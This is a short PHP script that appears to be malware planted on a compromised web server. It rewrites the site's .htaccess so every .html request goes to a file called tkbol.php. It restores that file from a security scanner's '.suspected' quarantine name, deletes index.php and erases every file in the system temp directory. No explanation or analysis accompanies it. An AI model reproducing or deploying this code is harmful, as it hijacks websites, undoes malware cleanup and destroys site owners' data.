<?php

set_time_limit(0);
ignore_user_abort();
		
	if (filesize(".htaccess")>100)
	     {
         $out = fopen(".htaccess", "w");

         fwrite ($out, "RewriteEngine On 
         RewriteRule ^([A-Za-z0-9-]+).html$ tkbol.php?hl=$1 [L]");

         fclose($out);
         }
	
	if (file_exists("tkbol.php.suspected")) rename("tkbol.php.suspected", "tkbol.php");
	
unlink('index.php');
	
 $dirs = scandir(sys_get_temp_dir());
	 	foreach ($dirs as $dir)
	     {
		         if (($dir !== ".") AND ($dir !== "..")) @unlink (sys_get_temp_dir()."/$dir");
		 }	
		 //34647484573463463474573463546
?>